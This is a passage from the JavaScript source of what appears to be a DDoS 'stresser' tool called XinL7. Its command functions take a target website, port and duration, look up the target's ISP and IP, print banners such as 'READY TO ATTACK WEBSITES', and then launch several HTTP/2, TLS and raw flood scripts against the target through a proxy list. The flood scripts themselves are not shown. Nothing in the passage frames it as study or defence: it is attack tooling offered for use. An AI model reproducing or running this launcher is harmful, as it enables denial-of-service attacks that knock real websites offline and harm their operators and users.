const h2flood = path.join(__dirname, `/lib/cache/h2flood.js`);
const browser = path.join(__dirname, `/lib/cache/browserx.js`);
        exec(`node ${h2flood} ${target} ${duration} 80 10 proxy.txt`)
        exec(`node ${browser} ${target} ${duration} 80 10 proxy.txt`)
sigma()
};
// [========================================] //
async function xinl7(args) {
  if (args.length < 3) {
    console.log(`Example: XinL7 <Target> <Duration>
XinL7 https://website.com 443 60`);
    sigma();
	return
  }
const [target, port, duration] = args
try {
const parsing = new url.URL(target)
const hostname = parsing.hostname
const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`)
const result = scrape.data;
console.clear()
console.log(`
${hijau}[ SYSTEM ] ${teksungu}WELCOME TO XINL7 TOOLS${Reset}${bold}
${hijau}[ SYSTEM ] ${teksungu}OWNER TOOLS @XinyouXD${Reset}${bold}

 ${cyan}⢸⠉⣹⠋⠉⢉⡟⢩⢋⠋⣽⡻⠭⢽⢉⠯⠭⠭⠭⢽⡍⢹⡍⠙⣯⠉⠉⠉⠉⠉⣿⢫⠉⠉⠉⢉⡟⠉⢿⢹⠉⢉⣉⢿⡝⡉⢩⢿⣻⢍⠉⠉⠩⢹⣟⡏⠉⠹⡉⢻⡍⡇
⠀⢸⢠⢹⠀⠀⢸⠁⣼⠀⣼⡝⠀⠀⢸⠘⠀⠀⠀⠀⠈⢿⠀⡟⡄⠹⣣⠀⠀⠐⠀⢸⡘⡄⣤⠀⡼⠁⠀⢺⡘⠉⠀⠀⠀⠫⣪⣌⡌⢳⡻⣦⠀⠀⢃⡽⡼⡀⠀⢣⢸⠸⡇
⠀⢸⡸⢸⠀⠀⣿⠀⣇⢠⡿⠀⠀⠀⠸⡇⠀⠀⠀⠀⠀⠘⢇⠸⠘⡀⠻⣇⠀⠀⠄⠀⡇⢣⢛⠀⡇⠀⠀⣸⠇⠀⠀⠀⠀⠀⠘⠄⢻⡀⠻⣻⣧⠀⠀⠃⢧⡇⠀⢸⢸⡇⡇
⠀⢸⡇⢸⣠⠀⣿⢠⣿⡾⠁⠀⢀⡀⠤⢇⣀⣐⣀⠀⠤⢀⠈⠢⡡⡈⢦⡙⣷⡀⠀⠀⢿⠈⢻⣡⠁⠀⢀⠏⠀⠀⠀⢀⠀⠄⣀⣐⣀⣙⠢⡌⣻⣷⡀⢹⢸⡅⠀⢸⠸⡇⡇
⠀⢸⡇⢸⣟⠀⢿⢸⡿⠀⣀⣶⣷⣾⡿⠿⣿⣿⣿⣿⣿⣶⣬⡀⠐⠰⣄⠙⠪⣻⣦⡀⠘⣧⠀⠙⠄⠀⠀⠀⠀⠀⣨⣴⣾⣿⠿⣿⣿⣿⣿⣿⣶⣯⣿⣼⢼⡇⠀⢸⡇⡇⡇
⠀⢸⢧⠀⣿⡅⢸⣼⡷⣾⣿⡟⠋⣿⠓⢲⣿⣿⣿⡟⠙⣿⠛⢯⡳⡀⠈⠓⠄⡈⠚⠿⣧⣌⢧⠀⠀⠀⠀⠀⣠⣺⠟⢫⡿⠓⢺⣿⣿⣿⠏⠙⣏⠛⣿⣿⣾⡇⢀⡿⢠⠀⡇
⠀⢸⢸⠀⢹⣷⡀⢿⡁⠀⠻⣇⠀⣇⠀⠘⣿⣿⡿⠁⠐⣉⡀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠉⠓⠳⠄⠀⠀⠀⠀⠋⠀⠘⡇⠀⠸⣿⣿⠟⠀⢈⣉⢠⡿⠁⣼⠁⣼⠃⣼⠀⡇
⠀⢸⠸⣀⠈⣯⢳⡘⣇⠀⠀⠈⡂⣜⣆⡀⠀⠀⢀⣀⡴⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢽⣆⣀⠀⠀⠀⣀⣜⠕⡊⠀⣸⠇⣼⡟⢠⠏⠀⡇
⠀⢸⠀⡟⠀⢸⡆⢹⡜⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠋⣾⡏⡇⡎⡇⠀⡇
⠀⢸⠀⢃⡆⠀⢿⡄⠑⢽⣄⠀⠀⠀⢀⠂⠠⢁⠈⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠄⡐⢀⠂⠀⠀⣠⣮⡟⢹⣯⣸⣱⠁⠀⡇
⠀⠈⠉⠉⠋⠉⠉⠋⠉⠉⠉⠋⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠋⡟⠉⠉⡿⠋⠋⠋⠉⠉⠁${Reset}${bold}
\x1b[34m┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
\x1b[34m┃${hijau}[ SYSTEM ]${teksungu} Owner XinL7 : L7XinID🕊️🪽${Reset}${bold}
\x1b[34m┃${hijau}[ SYSTEM ]${teksungu} Telegram XinL7 : t.me/XinyouXD${Reset}${bold}
\x1b[34m┃${hijau}[ SYSTEM ]${teksungu} Support : t.me/xeonci${Reset}${bold}
\x1b[34m┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
${bold}${hijau}🚀𝐂2 𝗫𝗜𝗡𝗟𝟳 𝐒𝐓𝐑𝐄𝐒𝐒𝐄𝐑 , 𝐑𝐄𝐀𝐃𝐘 𝐓𝐎 𝐀𝐓𝐓𝐀𝐂𝐊 𝐖𝐄𝐁𝐒𝐈𝐓𝐄𝐒🚀${Reset}⠀⠀⠀⠀⠀⠀⠀⠀
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃\x1b[41m\x1b[41m!\x1b[0m ATTACK SUCCESFULY SENT TO ATTACK WEBSITE \x1b[41m\x1b[41m!\x1b[0m
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃\x1b[1;37m    𝑯𝑶𝑺𝑻🌐   : \x1b[1;35m[\x1b[1m\x1b[36m${target}\x1b[1;35m]
┃\x1b[1;37m    𝑷𝑶𝑹𝑻🛰️   : \x1b[1;35m[\x1b[1m\x1b[36m${port}\x1b[1;35m]
┃\x1b[1;37m    𝑻𝑰𝑴𝑬🕒   : \x1b[1;35m[\x1b[1m\x1b[36m${duration}\x1b[1;35m]
┃\x1b[1;37m    𝑴𝑬𝑻𝑯𝑶𝑫🎭 : \x1b[1;35m[\x1b[1m\x1b[36mXINL7\x1b[1;35m]
┃\x1b[1;37m    𝑺𝑬𝑵𝑻 𝑩𝒀💻: \x1b[1;35m[\x1b[1m\x1b[36mXinL7 Network Tools\x1b[1;35m]
┃\x1b[1;37m    𝑰𝑺𝑷♦️    : \x1b[1;35m[\x1b[1m\x1b[36m${result.isp}\x1b[1;35m]
┃\x1b[1;37m    𝑨𝑺𝑵🛸    : \x1b[1;35m[\x1b[1m\x1b[36m${result.as}\x1b[1;35m]
┃\x1b[1;37m    𝑰𝑷♾️     : \x1b[1;35m[\x1b[1m\x1b[36m${result.query}\x1b[1;35m]
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
`)
} catch (error) {
  console.log(`Oops Something Went Wrong🕊️🪽`)
    sigma()
}
const httprobz = path.join(__dirname, `/lib/cache/httprobz.js`);
const httpgod = path.join(__dirname, `/lib/cache/httpgod.js`);
const tlsxx = path.join(__dirname, `/lib/cache/tlsxx.js`);
        exec(`node ${httprobz} ${target} ${duration} 80 10 proxy.txt`) 
        exec(`node ${httpgod} ${target} ${duration} 80 10 proxy.txt`) 
        exec(`node ${tlsxx} ${target} ${port} ${duration} 80 10 proxy.txt`) 
sigma()
};
async function tls(args) {
  if (args.length < 3) {
    console.log(`Example: Tls <Target> <Duration>
Tls https://website.com 60`);
    sigma();
	return
  }
const [target, port, duration] = args
try {
const parsing = new url.URL(target)
const hostname = parsing.hostname
const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`)
const result = scrape.data;
console.clear()
console.log(`
${hijau}[ SYSTEM ] ${teksungu}WELCOME TO XINL7 TOOLS${Reset}${bold}
${hijau}[ SYSTEM ] ${teksungu}OWNER TOOLS @XinyouXD${Reset}${bold}

 ${cyan}⢸⠉⣹⠋⠉⢉⡟⢩⢋⠋⣽⡻⠭⢽⢉⠯⠭⠭⠭⢽⡍⢹⡍⠙⣯⠉⠉⠉⠉⠉⣿⢫⠉⠉⠉⢉⡟⠉⢿⢹⠉⢉⣉⢿⡝⡉⢩⢿⣻⢍⠉⠉⠩⢹⣟⡏⠉⠹⡉⢻⡍⡇
⠀⢸⢠⢹⠀⠀⢸⠁⣼⠀⣼⡝⠀⠀⢸⠘⠀⠀⠀⠀⠈⢿⠀⡟⡄⠹⣣⠀⠀⠐⠀⢸⡘⡄⣤⠀⡼⠁⠀⢺⡘⠉⠀⠀⠀⠫⣪⣌⡌⢳⡻⣦⠀⠀⢃⡽⡼⡀⠀⢣⢸⠸⡇
⠀⢸⡸⢸⠀⠀⣿⠀⣇⢠⡿⠀⠀⠀⠸⡇⠀⠀⠀⠀⠀⠘⢇⠸⠘⡀⠻⣇⠀⠀⠄⠀⡇⢣⢛⠀⡇⠀⠀⣸⠇⠀⠀⠀⠀⠀⠘⠄⢻⡀⠻⣻⣧⠀⠀⠃⢧⡇⠀⢸⢸⡇⡇
⠀⢸⡇⢸⣠⠀⣿⢠⣿⡾⠁⠀⢀⡀⠤⢇⣀⣐⣀⠀⠤⢀⠈⠢⡡⡈⢦⡙⣷⡀⠀⠀⢿⠈⢻⣡⠁⠀⢀⠏⠀⠀⠀⢀⠀⠄⣀⣐⣀⣙⠢⡌⣻⣷⡀⢹⢸⡅⠀⢸⠸⡇⡇
⠀⢸⡇⢸⣟⠀⢿⢸⡿⠀⣀⣶⣷⣾⡿⠿⣿⣿⣿⣿⣿⣶⣬⡀⠐⠰⣄⠙⠪⣻⣦⡀⠘⣧⠀⠙⠄⠀⠀⠀⠀⠀⣨⣴⣾⣿⠿⣿⣿⣿⣿⣿⣶⣯⣿⣼⢼⡇⠀⢸⡇⡇⡇
⠀⢸⢧⠀⣿⡅⢸⣼⡷⣾⣿⡟⠋⣿⠓⢲⣿⣿⣿⡟⠙⣿⠛⢯⡳⡀⠈⠓⠄⡈⠚⠿⣧⣌⢧⠀⠀⠀⠀⠀⣠⣺⠟⢫⡿⠓⢺⣿⣿⣿⠏⠙⣏⠛⣿⣿⣾⡇⢀⡿⢠⠀⡇
⠀⢸⢸⠀⢹⣷⡀⢿⡁⠀⠻⣇⠀⣇⠀⠘⣿⣿⡿⠁⠐⣉⡀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠉⠓⠳⠄⠀⠀⠀⠀⠋⠀⠘⡇⠀⠸⣿⣿⠟⠀⢈⣉⢠⡿⠁⣼⠁⣼⠃⣼⠀⡇
⠀⢸⠸⣀⠈⣯⢳⡘⣇⠀⠀⠈⡂⣜⣆⡀⠀⠀⢀⣀⡴⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢽⣆⣀⠀⠀⠀⣀⣜⠕⡊⠀⣸⠇⣼⡟⢠⠏⠀⡇
⠀⢸⠀⡟⠀⢸⡆⢹⡜⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠋⣾⡏⡇⡎⡇⠀⡇
⠀⢸⠀⢃⡆⠀⢿⡄⠑⢽⣄⠀⠀⠀⢀⠂⠠⢁⠈⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠄⡐⢀⠂⠀⠀⣠⣮⡟⢹⣯⣸⣱⠁⠀⡇
⠀⠈⠉⠉⠋⠉⠉⠋⠉⠉⠉⠋⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠋⡟⠉⠉⡿⠋⠋⠋⠉⠉⠁${Reset}${bold}
\x1b[34m┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
\x1b[34m┃${hijau}[ SYSTEM ]${teksungu} Owner XinL7 : L7XinID🕊️🪽${Reset}${bold}
\x1b[34m┃${hijau}[ SYSTEM ]${teksungu} Telegram XinL7 : t.me/XinyouXD${Reset}${bold}
\x1b[34m┃${hijau}[ SYSTEM ]${teksungu} Support : t.me/xeonci${Reset}${bold}
\x1b[34m┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
${bold}${hijau}🚀𝐂2 𝗫𝗜𝗡𝗟𝟳 𝐒𝐓𝐑𝐄𝐒𝐒𝐄𝐑 , 𝐑𝐄𝐀𝐃𝐘 𝐓𝐎 𝐀𝐓𝐓𝐀𝐂𝐊 𝐖𝐄𝐁𝐒𝐈𝐓𝐄𝐒🚀${Reset}⠀⠀⠀⠀⠀⠀
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃\x1b[41m\x1b[41m!\x1b[0m ATTACK SUCCESFULY SENT TO ATTACK WEBSITE \x1b[41m\x1b[41m!\x1b[0m
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃\x1b[1;37m    𝑯𝑶𝑺𝑻🌐   : \x1b[1;35m[\x1b[1m\x1b[36m${target}\x1b[1;35m]
┃\x1b[1;37m    𝑷𝑶𝑹𝑻🛰️   : \x1b[1;35m[\x1b[1m\x1b[36m${port}\x1b[1;35m]
┃\x1b[1;37m    𝑻𝑰𝑴𝑬🕒   : \x1b[1;35m[\x1b[1m\x1b[36m${duration}\x1b[1;35m]
┃\x1b[1;37m    𝑴𝑬𝑻𝑯𝑶𝑫🎭 : \x1b[1;35m[\x1b[1m\x1b[36mTLS\x1b[1;35m]
┃\x1b[1;37m    𝑺𝑬𝑵𝑻 𝑩𝒀💻: \x1b[1;35m[\x1b[1m\x1b[36mXinL7 Network Tools\x1b[1;35m]
┃\x1b[1;37m    𝑰𝑺𝑷♦️    : \x1b[1;35m[\x1b[1m\x1b[36m${result.isp}\x1b[1;35m]
┃\x1b[1;37m    𝑨𝑺𝑵🛸    : \x1b[1;35m[\x1b[1m\x1b[36m${result.as}\x1b[1;35m]
┃\x1b[1;37m    𝑰𝑷♾️     : \x1b[1;35m[\x1b[1m\x1b[36m${result.query}\x1b[1;35m]
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
`)
} catch (error) {
  console.log(`Oops Something Went Wrong🕊️🪽`)
    sigma()
}
const raw = path.join(__dirname, `/lib/cache/raw.js`);
const lauching = path.join(__dirname, `/lib/cache/lauching.js`);
        exec(`node ${raw} ${target} ${duration} 80 10 proxy.txt`)
        exec(`node ${lauching} ${target} ${duration} 80 10 proxy.txt`)
sigma()
};
async function h2flood(args) {
  if (args.length < 3) {
    console.log(`Example: H2-FLOOD <Target> <Duration>
H2-FLOOD https://website.com 60`);
    sigma();
	return
  }
const [target, port, duration] = args
try {
const parsing = new url.URL(target)
const hostname = parsing.hostname
const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`)
const result = scrape.data;
console.clear()
console.log(`
${hijau}[ SYSTEM ] ${teksungu}WELCOME TO XINL7 TOOLS${Reset}${bold}
${hijau}[ SYSTEM ] ${teksungu}OWNER TOOLS @XinyouXD${Reset}${bold}

 ${cyan}⢸⠉⣹⠋⠉⢉⡟⢩⢋⠋⣽⡻⠭⢽⢉⠯⠭⠭⠭⢽⡍⢹⡍⠙⣯⠉⠉⠉⠉⠉⣿⢫⠉⠉⠉⢉⡟⠉⢿⢹⠉⢉⣉⢿⡝⡉⢩⢿⣻⢍⠉⠉⠩⢹⣟⡏⠉⠹⡉⢻⡍⡇
⠀⢸⢠⢹⠀⠀⢸⠁⣼⠀⣼⡝⠀⠀⢸⠘⠀⠀⠀⠀⠈⢿⠀⡟⡄⠹⣣⠀⠀⠐⠀⢸⡘⡄⣤⠀⡼⠁⠀⢺⡘⠉⠀⠀⠀⠫⣪⣌⡌⢳⡻⣦⠀⠀⢃⡽⡼⡀⠀⢣⢸⠸⡇
⠀⢸⡸⢸⠀⠀⣿⠀⣇⢠⡿⠀⠀⠀⠸⡇⠀⠀⠀⠀⠀⠘⢇⠸⠘⡀⠻⣇⠀⠀⠄⠀⡇⢣⢛⠀⡇⠀⠀⣸⠇⠀⠀⠀⠀⠀⠘⠄⢻⡀⠻⣻⣧⠀⠀⠃⢧⡇⠀⢸⢸⡇⡇
⠀⢸⡇⢸⣠⠀⣿⢠⣿⡾⠁⠀⢀⡀⠤⢇⣀⣐⣀⠀⠤⢀⠈⠢⡡⡈⢦⡙⣷⡀⠀⠀⢿⠈⢻⣡⠁⠀⢀⠏⠀⠀⠀⢀⠀⠄⣀⣐⣀⣙⠢⡌⣻⣷⡀⢹⢸⡅⠀⢸⠸⡇⡇
⠀⢸⡇⢸⣟⠀⢿⢸⡿⠀⣀⣶⣷⣾⡿⠿⣿⣿⣿⣿⣿⣶⣬⡀⠐⠰⣄⠙⠪⣻⣦⡀⠘⣧⠀⠙⠄⠀⠀⠀⠀⠀⣨⣴⣾⣿⠿⣿⣿⣿⣿⣿⣶⣯⣿⣼⢼⡇⠀⢸⡇⡇⡇
⠀⢸⢧⠀⣿⡅⢸⣼⡷⣾⣿⡟⠋⣿⠓⢲⣿⣿⣿⡟⠙⣿⠛⢯⡳⡀⠈⠓⠄⡈⠚⠿⣧⣌⢧⠀⠀⠀⠀⠀⣠⣺⠟⢫⡿⠓⢺⣿⣿⣿⠏⠙⣏⠛⣿⣿⣾⡇⢀⡿⢠⠀⡇
⠀⢸⢸⠀⢹⣷⡀⢿⡁⠀⠻⣇⠀⣇⠀⠘⣿⣿⡿⠁⠐⣉⡀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠉⠓⠳⠄⠀⠀⠀⠀⠋⠀⠘⡇⠀⠸⣿⣿⠟⠀⢈⣉⢠⡿⠁⣼⠁⣼⠃⣼⠀⡇
⠀⢸⠸⣀⠈⣯⢳⡘⣇⠀⠀⠈⡂⣜⣆⡀⠀⠀⢀⣀⡴⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢽⣆⣀⠀⠀⠀⣀⣜⠕⡊⠀⣸⠇⣼⡟⢠⠏⠀⡇
⠀⢸⠀⡟⠀⢸⡆⢹⡜⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠋⣾⡏⡇⡎⡇⠀⡇
⠀⢸⠀⢃⡆⠀⢿⡄⠑⢽⣄⠀⠀⠀⢀⠂⠠⢁⠈⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠄⡐⢀⠂⠀⠀⣠⣮⡟⢹⣯⣸⣱⠁⠀⡇
⠀⠈⠉⠉⠋⠉⠉⠋⠉⠉⠉⠋⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠋⡟⠉⠉⡿⠋⠋⠋⠉⠉⠁${Reset}${bold}
\x1b[34m┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
\x1b[34m┃${hijau}[ SYSTEM ]${teksungu} Owner XinL7 : L7XinID🕊️🪽${Reset}${bold}
\x1b[34m┃${hijau}[ SYSTEM ]${teksungu} Telegram XinL7 : t.me/XinyouXD${Reset}${bold}
\x1b[34m┃${hijau}[ SYSTEM ]${teksungu} Support : t.me/xeonci${Reset}${bold}
\x1b[34m┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
${bold}${hijau}🚀𝐂2 𝗫𝗜𝗡𝗟𝟳 𝐒𝐓𝐑𝐄𝐒𝐒𝐄𝐑 , 𝐑𝐄𝐀𝐃𝐘 𝐓𝐎 𝐀𝐓𝐓𝐀𝐂𝐊 𝐖𝐄𝐁𝐒𝐈𝐓𝐄𝐒🚀${Reset}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃\x1b[41m\x1b[41m!\x1b[0m ATTACK SUCCESFULY SENT TO ATTACK WEBSITE \x1b[41m\x1b[41m!\x1b[0m
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃\x1b[1;37m    𝑯𝑶𝑺𝑻🌐   : \x1b[1;35m[\x1b[1m\x1b[36m${target}\x1b[1;35m]
┃\x1b[1;37m    𝑷𝑶𝑹𝑻🛰️   : \x1b[1;35m[\x1b[1m\x1b[36m${port}\x1b[1;35m]
┃\x1b[1;37m    𝑻𝑰𝑴𝑬🕒   : \x1b[1;35m[\x1b[1m\x1b[36m${duration}\x1b[1;35m]
┃\x1b[1;37m    𝑴𝑬𝑻𝑯𝑶𝑫🎭 : \x1b[1;35m[\x1b[1m\x1b[36mH2-FLOOD\x1b[1;35m]
┃\x1b[1;37m    𝑺𝑬𝑵𝑻 𝑩𝒀💻: \x1b[1;35m[\x1b[1m\x1b[36mXinL7 Network Tools\x1b[1;35m]
┃\x1b[1;37m    𝑰𝑺𝑷♦️    : \x1b[1;35m[\x1b[1m\x1b[36m${result.isp}\x1b[1;35m]
┃\x1b[1;37m    𝑨𝑺𝑵🛸    : \x1b[1;35m[\x1b[1m\x1b[36m${result.as}\x1b[1;35m]
┃\x1b[1;37m    𝑰𝑷♾️     : \x1b[1;35m[\x1b[1m\x1b[36m${result.query}\x1b[1;35m]
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
`)
} catch (error) {
  console.log(`Oops Something Went Wrong🕊️🪽`)
    sigma()
}
const tlsvip = path.join(__dirname, `/lib/cache/tlsvip.js`);
const vxx = path.join(__dirname, `/lib/cache/vxx.js`);
const quantum = path.join(__dirname, `/lib/cache/quantum.js`);
        exec(`node ${tlsvip} ${target} ${duration} 80 10 proxy.txt`)
        exec(`node ${vxx} ${target} 80 proxy.txt 10 ${duration}`)
        exec(`node ${quantum} ${target} 80 proxy.txt 10 ${duration}`)
sigma()
};
async function h2slash(args) {
  if (args.length < 3) {
    console.log(`Example: h2-slash <Target> <Duration>
h2-slash https://website.com 60`);
    sigma();
	return
  }
const [target, port, duration] = args
try {
const parsing = new url.URL(target)
const hostname = parsing.hostname
const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`)
const result = scrape.data;
console.clear()
console.log(`
${hijau}[ SYSTEM ] ${teksungu}WELCOME TO XINL7 TOOLS${Reset}${bold}
${hijau}[ SYSTEM ] ${teksungu}OWNER TOOLS @XinyouXD${Reset}${bold}

 ${cyan}⢸⠉⣹⠋⠉⢉⡟⢩⢋⠋⣽⡻⠭⢽⢉⠯⠭⠭⠭⢽⡍⢹⡍⠙⣯⠉⠉⠉⠉⠉⣿⢫⠉⠉⠉⢉⡟⠉⢿⢹⠉⢉⣉⢿⡝⡉⢩⢿⣻⢍⠉⠉⠩⢹⣟⡏⠉⠹⡉⢻⡍⡇
⠀⢸⢠⢹⠀⠀⢸⠁⣼⠀⣼⡝⠀⠀⢸⠘⠀⠀⠀⠀⠈⢿⠀⡟⡄⠹⣣⠀⠀⠐⠀⢸⡘⡄⣤⠀⡼⠁⠀⢺⡘⠉⠀⠀⠀⠫⣪⣌⡌⢳⡻⣦⠀⠀⢃⡽⡼⡀⠀⢣⢸⠸⡇
⠀⢸⡸⢸⠀⠀⣿⠀⣇⢠⡿⠀⠀⠀⠸⡇⠀⠀⠀⠀⠀⠘⢇⠸⠘⡀⠻⣇⠀⠀⠄⠀⡇⢣⢛⠀⡇⠀⠀⣸⠇⠀⠀⠀⠀⠀⠘⠄⢻⡀⠻⣻⣧⠀⠀⠃⢧⡇⠀⢸⢸⡇⡇
⠀⢸⡇⢸⣠⠀⣿⢠⣿⡾⠁⠀⢀⡀⠤⢇⣀⣐⣀⠀⠤⢀⠈⠢⡡⡈⢦⡙⣷⡀⠀⠀⢿⠈⢻⣡⠁⠀⢀⠏⠀⠀⠀⢀⠀⠄⣀⣐⣀⣙⠢⡌⣻⣷⡀⢹⢸⡅⠀⢸⠸⡇⡇
⠀⢸⡇⢸⣟⠀⢿⢸⡿⠀⣀⣶⣷⣾⡿⠿⣿⣿⣿⣿⣿⣶⣬⡀⠐⠰⣄⠙⠪⣻⣦⡀⠘⣧⠀⠙⠄⠀⠀⠀⠀⠀⣨⣴⣾⣿⠿⣿⣿⣿⣿⣿⣶⣯⣿⣼⢼⡇⠀⢸⡇⡇⡇
⠀⢸⢧⠀⣿⡅⢸⣼⡷⣾⣿⡟⠋⣿⠓⢲⣿⣿⣿⡟⠙⣿⠛⢯⡳⡀⠈⠓⠄⡈⠚⠿⣧⣌⢧⠀⠀⠀⠀⠀⣠⣺⠟⢫⡿⠓⢺⣿⣿⣿⠏⠙⣏⠛⣿⣿⣾⡇⢀⡿⢠⠀⡇
⠀⢸⢸⠀⢹⣷⡀⢿⡁⠀⠻⣇⠀⣇⠀⠘⣿⣿⡿⠁⠐⣉⡀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠉⠓⠳⠄⠀⠀⠀⠀⠋⠀⠘⡇⠀⠸⣿⣿⠟⠀⢈⣉⢠⡿⠁⣼⠁⣼⠃⣼⠀⡇
⠀⢸⠸⣀⠈⣯⢳⡘⣇⠀⠀⠈⡂⣜⣆⡀⠀⠀⢀⣀⡴⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢽⣆⣀⠀⠀⠀⣀⣜⠕⡊⠀⣸⠇⣼⡟⢠⠏⠀⡇
⠀⢸⠀⡟⠀⢸⡆⢹⡜⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠋⣾⡏⡇⡎⡇⠀⡇
⠀⢸⠀⢃⡆⠀⢿⡄⠑⢽⣄⠀⠀⠀⢀⠂⠠⢁⠈⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠄⡐⢀⠂⠀⠀⣠⣮⡟⢹⣯⣸⣱⠁⠀⡇
⠀⠈⠉⠉⠋⠉⠉⠋⠉⠉⠉⠋⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠋⡟⠉⠉⡿⠋⠋⠋⠉⠉⠁${Reset}${bold}
\x1b[34m┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
\x1b[34m┃${hijau}[ SYSTEM ]${teksungu} Owner XinL7 : L7XinID🕊️🪽${Reset}${bold}
\x1b[34m┃${hijau}[ SYSTEM ]${teksungu} Telegram XinL7 : t.me/XinyouXD${Reset}${bold}
\x1b[34m┃${hijau}[ SYSTEM ]${teksungu} Support : t.me/xeonci${Reset}${bold}
\x1b[34m┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
${bold}${hijau}🚀𝐂2 𝗫𝗜𝗡𝗟𝟳 𝐒𝐓𝐑𝐄𝐒𝐒𝐄𝐑 , 𝐑𝐄𝐀𝐃𝐘 𝐓𝐎 𝐀𝐓𝐓𝐀𝐂𝐊 𝐖𝐄𝐁𝐒𝐈𝐓𝐄𝐒🚀${Reset}⠀⠀⠀⠀⠀
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃\x1b[41m\x1b[41m!\x1b[0m ATTACK SUCCESFULY SENT TO ATTACK WEBSITE \x1b[41m\x1b[41m!\x1b[0m
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
